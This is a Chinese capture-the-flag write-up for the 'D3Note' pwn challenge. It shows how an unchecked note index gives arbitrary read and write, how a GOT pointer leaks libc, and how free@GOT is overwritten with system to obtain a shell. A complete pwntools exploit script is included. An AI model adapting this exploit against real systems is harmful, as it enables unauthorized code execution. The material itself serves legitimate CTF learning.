# D3Note

## 题目简述

程序表面上是常见的堆笔记管理器，但决定性漏洞并不是堆分配器本身，而是所有操作都没有校验笔记下标。笔记表位于固定地址附近，攻击者可用负数或超大下标把表项访问移动到任意静态地址，从而获得受对齐条件约束的任意地址读写。

利用时先借助程序 `.LOAD` 区域中指向 GOT 的指针泄露 `puts` 实际地址，计算 libc 基址与 `system`；再把 `free@GOT` 的低 4 字节改成 `system`，并令被“删除”的表项内容为 `/bin/sh\x00`，最终把 `free("/bin/sh")` 转化为 `system("/bin/sh")`。

## 解题过程

### 将越界下标换算为地址

笔记表基址为 `0x4040a0`，单个表项跨度为 `0x10`。`show` 操作实际读取表项中偏移 `+8` 的指针，因此要读取目标地址 `addr`，下标为：

$$
\mathrm{index}_{read}
=\frac{\mathrm{addr}-0x4040a0-8}{16}
$$

目标必须满足相应的 16 字节对齐关系。`add` 操作写表项起始字段时使用：

$$
\mathrm{index}_{write}
=\frac{\mathrm{addr}-0x4040a0}{16}
$$

原程序没有检查这个下标是否落在笔记数组内，因此目标地址即使位于 GOT 或其他全局区域，也会被当作普通表项处理。

### 解析 GOT 并泄露 libc

动态链接采用延迟绑定。先正常申请并释放一次笔记，使 `free` 等符号完成解析；随后读取 `.LOAD` 区域中保存的 `puts@GOT` 指针，得到 libc 中的 `puts` 地址：

$$
\mathrm{libc\_base}
=\mathrm{puts\_runtime}-\mathrm{offset}_{libc}(\mathrm{puts})
$$

进而计算：

$$
\mathrm{system}
=\mathrm{libc\_base}+\mathrm{offset}_{libc}(\mathrm{system})
$$

### GOT 劫持

题目环境中 `free@GOT` 与 `system` 位于同一 libc 映射，地址高 4 字节相同，所以现有写原语只覆盖 `system` 地址的低 4 字节即可。把 `/bin/sh\x00` 放在相邻的内容位置后，再对映射到 `free@GOT` 的伪表项执行删除：

```text
delete(fake_index)
    └─ free("/bin/sh")
       └─ system("/bin/sh")
```

下面是清理后的完整利用脚本。远程运行时可传入 `HOST=<地址> PORT=<端口>`；不传参数时启动本地 `./pwn`：

```python
#!/usr/bin/env python3
from pwn import *


context.arch = "amd64"
context.log_level = "info"

BINARY = "./pwn"
LIBC = "./libc.so.6"
ENTRY_TABLE = 0x4040A0
POINTER_TO_PUTS_GOT = 0x400688

elf = ELF(BINARY, checksec=False)
libc = ELF(LIBC, checksec=False)

if args.HOST and args.PORT:
    io = remote(args.HOST, int(args.PORT))
else:
    io = process(BINARY)


def show(index: int) -> bytes:
    io.sendline(b"1300")
    io.sendline(str(index).encode())
    return io.recvline()


def add(index: int, size: int, content: bytes) -> None:
    io.sendline(b"276")
    io.sendline(str(index).encode())
    io.sendline(str(size).encode())
    io.sendline(content)


def delete(index: int) -> None:
    io.sendline(b"6425")
    io.sendline(str(index).encode())


def leak_aligned(address: int) -> bytes:
    offset = address - ENTRY_TABLE
    assert (offset - 8) % 16 == 0
    return show((offset - 8) // 16)


def write_low_dword(address: int, value: int, adjacent: bytes) -> None:
    offset = address - ENTRY_TABLE
    assert offset % 16 == 0
    low = value & 0xFFFFFFFF
    assert low < 0x80000000
    add(offset // 16, low, adjacent)


# 触发一次动态解析。
add(1, 0x100, b"warmup")
delete(1)

puts_runtime = u64(
    leak_aligned(POINTER_TO_PUTS_GOT)[:6].ljust(8, b"\x00")
)
libc.address = puts_runtime - libc.sym["puts"]
system = libc.sym["system"]

log.info("libc base = %#x", libc.address)
log.info("system    = %#x", system)

free_got = elf.got["free"]
write_low_dword(free_got, system, b"/bin/sh\x00")
delete((free_got - ENTRY_TABLE) // 16)

io.interactive()
```

脚本中的菜单号、静态地址和对齐关系来自题目二进制；若更换二进制或 libc，必须重新核对，而不能直接复用这些常量。

## 方法总结

这是一道“伪堆题”：表面功能是堆对象管理，真正的利用原语来自数组下标未校验。分析时应先把每个菜单操作还原成“基址 + 下标 × 步长 + 字段偏移”，再判断它能覆盖哪些目标。

拿到任意地址读写后，GOT 劫持只是最短利用链之一；返回地址、hook 或其他控制数据也可能成为目标。本题选择 `free@GOT→system`，是因为程序天然提供删除操作和可控的 `/bin/sh` 内容，触发路径最直接。
